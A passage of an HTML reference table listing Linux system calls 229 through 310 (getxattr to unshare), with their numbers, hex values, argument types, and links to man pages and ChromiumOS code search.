align="center">229</td><td>getxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getxattr">cs/</a></td><td align="center">0xe5</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">230</td><td>lgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lgetxattr">cs/</a></td><td align="center">0xe6</td><td>const char *path</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">231</td><td>fgetxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fgetxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fgetxattr">cs/</a></td><td align="center">0xe7</td><td>int fd</td><td>const char *name</td><td>void *value</td><td>size_t size</td><td>-</td><td>-</td></tr><tr><td align="center">232</td><td>listxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listxattr">cs/</a></td><td align="center">0xe8</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">233</td><td>llistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/llistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*llistxattr">cs/</a></td><td align="center">0xe9</td><td>const char *path</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">234</td><td>flistxattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/flistxattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*flistxattr">cs/</a></td><td align="center">0xea</td><td>int fd</td><td>char *list</td><td>size_t size</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">235</td><td>removexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/removexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*removexattr">cs/</a></td><td align="center">0xeb</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">236</td><td>lremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lremovexattr">cs/</a></td><td align="center">0xec</td><td>const char *path</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">237</td><td>fremovexattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fremovexattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fremovexattr">cs/</a></td><td align="center">0xed</td><td>int fd</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">238</td><td>tkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tkill">cs/</a></td><td align="center">0xee</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">239</td><td>sendfile64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendfile64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendfile64">cs/</a></td><td align="center">0xef</td><td>int out_fd</td><td>int in_fd</td><td>loff_t *offset</td><td>size_t count</td><td>-</td><td>-</td></tr><tr><td align="center">240</td><td>futex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futex">cs/</a></td><td align="center">0xf0</td><td>u32 *uaddr</td><td>int op</td><td>u32 val</td><td>struct __kernel_timespec *utime</td><td>u32 *uaddr2</td><td>u32 val3</td></tr><tr><td align="center">241</td><td>sched_setaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_setaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_setaffinity">cs/</a></td><td align="center">0xf1</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">242</td><td>sched_getaffinity</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sched_getaffinity.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sched_getaffinity">cs/</a></td><td align="center">0xf2</td><td>pid_t pid</td><td>unsigned int len</td><td>unsigned long *user_mask_ptr</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">243</td><td>set_thread_area</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_thread_area.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_thread_area">cs/</a></td><td align="center">0xf3</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">244</td><td>get_thread_area</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_thread_area.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_thread_area">cs/</a></td><td align="center">0xf4</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">245</td><td>io_setup</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_setup.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_setup">cs/</a></td><td align="center">0xf5</td><td>unsigned nr_reqs</td><td>aio_context_t *ctx</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">246</td><td>io_destroy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_destroy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_destroy">cs/</a></td><td align="center">0xf6</td><td>aio_context_t ctx</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">247</td><td>io_getevents</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_getevents.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_getevents">cs/</a></td><td align="center">0xf7</td><td>aio_context_t ctx_id</td><td>long min_nr</td><td>long nr</td><td>struct io_event *events</td><td>struct __kernel_timespec *timeout</td><td>-</td></tr><tr><td align="center">248</td><td>io_submit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_submit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_submit">cs/</a></td><td align="center">0xf8</td><td>aio_context_t</td><td>long</td><td>struct iocb * *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">249</td><td>io_cancel</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/io_cancel.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*io_cancel">cs/</a></td><td align="center">0xf9</td><td>aio_context_t ctx_id</td><td>struct iocb *iocb</td><td>struct io_event *result</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">250</td><td>fadvise64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fadvise64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fadvise64">cs/</a></td><td align="center">0xfa</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>-</td></tr><tr><td align="center">251</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0xfb</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">252</td><td>exit_group</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/exit_group.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*exit_group">cs/</a></td><td align="center">0xfc</td><td>int error_code</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">253</td><td>lookup_dcookie</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/lookup_dcookie.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*lookup_dcookie">cs/</a></td><td align="center">0xfd</td><td>u64 cookie64</td><td>char *buf</td><td>size_t len</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">254</td><td>epoll_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_create">cs/</a></td><td align="center">0xfe</td><td>int size</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">255</td><td>epoll_ctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_ctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_ctl">cs/</a></td><td align="center">0xff</td><td>int epfd</td><td>int op</td><td>int fd</td><td>struct epoll_event *event</td><td>-</td><td>-</td></tr><tr><td align="center">256</td><td>epoll_wait</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/epoll_wait.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*epoll_wait">cs/</a></td><td align="center">0x100</td><td>int epfd</td><td>struct epoll_event *events</td><td>int maxevents</td><td>int timeout</td><td>-</td><td>-</td></tr><tr><td align="center">257</td><td>remap_file_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/remap_file_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*remap_file_pages">cs/</a></td><td align="center">0x101</td><td>unsigned long start</td><td>unsigned long size</td><td>unsigned long prot</td><td>unsigned long pgoff</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">258</td><td>set_tid_address</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_tid_address.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_tid_address">cs/</a></td><td align="center">0x102</td><td>int *tidptr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">259</td><td>timer_create</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_create.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_create">cs/</a></td><td align="center">0x103</td><td>clockid_t which_clock</td><td>struct sigevent *timer_event_spec</td><td>timer_t * created_timer_id</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">260</td><td>timer_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_settime">cs/</a></td><td align="center">0x104</td><td>timer_t timer_id</td><td>int flags</td><td>const struct __kernel_itimerspec *new_setting</td><td>struct __kernel_itimerspec *old_setting</td><td>-</td><td>-</td></tr><tr><td align="center">261</td><td>timer_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_gettime">cs/</a></td><td align="center">0x105</td><td>timer_t timer_id</td><td>struct __kernel_itimerspec *setting</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">262</td><td>timer_getoverrun</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_getoverrun.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_getoverrun">cs/</a></td><td align="center">0x106</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">263</td><td>timer_delete</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/timer_delete.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*timer_delete">cs/</a></td><td align="center">0x107</td><td>timer_t timer_id</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">264</td><td>clock_settime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_settime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_settime">cs/</a></td><td align="center">0x108</td><td>clockid_t which_clock</td><td>const struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">265</td><td>clock_gettime</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_gettime.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_gettime">cs/</a></td><td align="center">0x109</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">266</td><td>clock_getres</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_getres.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_getres">cs/</a></td><td align="center">0x10a</td><td>clockid_t which_clock</td><td>struct __kernel_timespec *tp</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">267</td><td>clock_nanosleep</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clock_nanosleep.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clock_nanosleep">cs/</a></td><td align="center">0x10b</td><td>clockid_t which_clock</td><td>int flags</td><td>const struct __kernel_timespec *rqtp</td><td>struct __kernel_timespec *rmtp</td><td>-</td><td>-</td></tr><tr><td align="center">268</td><td>statfs64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/statfs64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*statfs64">cs/</a></td><td align="center">0x10c</td><td>const char *path</td><td>size_t sz</td><td>struct statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">269</td><td>fstatfs64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatfs64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatfs64">cs/</a></td><td align="center">0x10d</td><td>unsigned int fd</td><td>size_t sz</td><td>struct statfs64 *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">270</td><td>tgkill</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/tgkill.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*tgkill">cs/</a></td><td align="center">0x10e</td><td>pid_t tgid</td><td>pid_t pid</td><td>int sig</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">271</td><td>utimes</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/utimes.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*utimes">cs/</a></td><td align="center">0x10f</td><td>char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">272</td><td>fadvise64_64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fadvise64_64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fadvise64_64">cs/</a></td><td align="center">0x110</td><td>int fd</td><td>loff_t offset</td><td>loff_t len</td><td>int advice</td><td>-</td><td>-</td></tr><tr><td align="center">273</td><td>vserver</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/vserver.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*vserver">cs/</a></td><td align="center">0x111</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">274</td><td>mbind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mbind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mbind">cs/</a></td><td align="center">0x112</td><td>unsigned long start</td><td>unsigned long len</td><td>unsigned long mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned flags</td></tr><tr><td align="center">275</td><td>get_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/get_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*get_mempolicy">cs/</a></td><td align="center">0x113</td><td>int *policy</td><td>unsigned long *nmask</td><td>unsigned long maxnode</td><td>unsigned long addr</td><td>unsigned long flags</td><td>-</td></tr><tr><td align="center">276</td><td>set_mempolicy</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/set_mempolicy.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*set_mempolicy">cs/</a></td><td align="center">0x114</td><td>int mode</td><td>const unsigned long *nmask</td><td>unsigned long maxnode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">277</td><td>mq_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_open">cs/</a></td><td align="center">0x115</td><td>const char *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr *attr</td><td>-</td><td>-</td></tr><tr><td align="center">278</td><td>mq_unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_unlink">cs/</a></td><td align="center">0x116</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">279</td><td>mq_timedsend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend">cs/</a></td><td align="center">0x117</td><td>mqd_t mqdes</td><td>const char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">280</td><td>mq_timedreceive</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive">cs/</a></td><td align="center">0x118</td><td>mqd_t mqdes</td><td>char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int *msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">281</td><td>mq_notify</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_notify.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_notify">cs/</a></td><td align="center">0x119</td><td>mqd_t mqdes</td><td>const struct sigevent *notification</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">282</td><td>mq_getsetattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_getsetattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_getsetattr">cs/</a></td><td align="center">0x11a</td><td>mqd_t mqdes</td><td>const struct mq_attr *mqstat</td><td>struct mq_attr *omqstat</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">283</td><td>kexec_load</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/kexec_load.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*kexec_load">cs/</a></td><td align="center">0x11b</td><td>unsigned long entry</td><td>unsigned long nr_segments</td><td>struct kexec_segment *segments</td><td>unsigned long flags</td><td>-</td><td>-</td></tr><tr><td align="center">284</td><td>waitid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/waitid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*waitid">cs/</a></td><td align="center">0x11c</td><td>int which</td><td>pid_t pid</td><td>struct siginfo *infop</td><td>int options</td><td>struct rusage *ru</td><td>-</td></tr><tr><td align="center">285</td><td><em>not implemented</em></td><td align="center"></td><td align="center">0x11d</td><td></td><td></td><td></td><td></td><td></td><td></td></tr><tr><td align="center">286</td><td>add_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/add_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*add_key">cs/</a></td><td align="center">0x11e</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td></tr><tr><td align="center">287</td><td>request_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/request_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*request_key">cs/</a></td><td align="center">0x11f</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td></tr><tr><td align="center">288</td><td>keyctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/keyctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*keyctl">cs/</a></td><td align="center">0x120</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">289</td><td>ioprio_set</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_set.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_set">cs/</a></td><td align="center">0x121</td><td>int which</td><td>int who</td><td>int ioprio</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">290</td><td>ioprio_get</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ioprio_get.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ioprio_get">cs/</a></td><td align="center">0x122</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">291</td><td>inotify_init</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_init.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_init">cs/</a></td><td align="center">0x123</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">292</td><td>inotify_add_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_add_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_add_watch">cs/</a></td><td align="center">0x124</td><td>int fd</td><td>const char *path</td><td>u32 mask</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">293</td><td>inotify_rm_watch</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/inotify_rm_watch.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*inotify_rm_watch">cs/</a></td><td align="center">0x125</td><td>int fd</td><td>__s32 wd</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">294</td><td>migrate_pages</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/migrate_pages.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*migrate_pages">cs/</a></td><td align="center">0x126</td><td>pid_t pid</td><td>unsigned long maxnode</td><td>const unsigned long *from</td><td>const unsigned long *to</td><td>-</td><td>-</td></tr><tr><td align="center">295</td><td>openat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/openat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*openat">cs/</a></td><td align="center">0x127</td><td>int dfd</td><td>const char *filename</td><td>int flags</td><td>umode_t mode</td><td>-</td><td>-</td></tr><tr><td align="center">296</td><td>mkdirat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mkdirat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mkdirat">cs/</a></td><td align="center">0x128</td><td>int dfd</td><td>const char * pathname</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">297</td><td>mknodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mknodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mknodat">cs/</a></td><td align="center">0x129</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>unsigned dev</td><td>-</td><td>-</td></tr><tr><td align="center">298</td><td>fchownat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchownat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchownat">cs/</a></td><td align="center">0x12a</td><td>int dfd</td><td>const char *filename</td><td>uid_t user</td><td>gid_t group</td><td>int flag</td><td>-</td></tr><tr><td align="center">299</td><td>futimesat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/futimesat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*futimesat">cs/</a></td><td align="center">0x12b</td><td>int dfd</td><td>const char *filename</td><td>struct timeval *utimes</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">300</td><td>fstatat64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fstatat64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fstatat64">cs/</a></td><td align="center">0x12c</td><td>int dfd</td><td>const char *filename</td><td>struct stat64 *statbuf</td><td>int flag</td><td>-</td><td>-</td></tr><tr><td align="center">301</td><td>unlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*unlinkat">cs/</a></td><td align="center">0x12d</td><td>int dfd</td><td>const char * pathname</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">302</td><td>renameat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/renameat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*renameat">cs/</a></td><td align="center">0x12e</td><td>int olddfd</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td></tr><tr><td align="center">303</td><td>linkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/linkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*linkat">cs/</a></td><td align="center">0x12f</td><td>int olddfd</td><td>const char *oldname</td><td>int newdfd</td><td>const char *newname</td><td>int flags</td><td>-</td></tr><tr><td align="center">304</td><td>symlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/symlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*symlinkat">cs/</a></td><td align="center">0x130</td><td>const char * oldname</td><td>int newdfd</td><td>const char * newname</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">305</td><td>readlinkat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readlinkat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readlinkat">cs/</a></td><td align="center">0x131</td><td>int dfd</td><td>const char *path</td><td>char *buf</td><td>int bufsiz</td><td>-</td><td>-</td></tr><tr><td align="center">306</td><td>fchmodat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fchmodat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fchmodat">cs/</a></td><td align="center">0x132</td><td>int dfd</td><td>const char * filename</td><td>umode_t mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">307</td><td>faccessat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/faccessat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*faccessat">cs/</a></td><td align="center">0x133</td><td>int dfd</td><td>const char *filename</td><td>int mode</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">308</td><td>pselect6</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/pselect6.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*pselect6">cs/</a></td><td align="center">0x134</td><td>int</td><td>fd_set *</td><td>fd_set *</td><td>fd_set *</td><td>struct __kernel_timespec *</td><td>void *</td></tr><tr><td align="center">309</td><td>ppoll</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/ppoll.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*ppoll">cs/</a></td><td align="center">0x135</td><td>struct pollfd *</td><td>unsigned int</td><td>struct __kernel_timespec *</td><td>const sigset_t *</td><td>size_t</td><td>-</td></tr><tr><td align="center">310</td><td>unshare</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/unshare.2.html">man/</a> <a 